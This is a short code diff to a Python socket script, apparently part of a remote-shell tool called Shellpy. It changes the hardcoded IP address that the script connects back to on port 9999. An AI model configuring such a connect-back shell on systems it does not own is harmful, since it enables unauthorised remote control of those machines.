@@ -9,7 +9,7 @@ def socket_create():
         global host
         global port
         global s
-        host = '192.92.192.192'#Add host IP Address
+        host = '192.0.0.0'#Add host IP Address of the system in which you run Shellpy.py
         port = 9999
         s = socket.socket()
     except socket.error as msg:
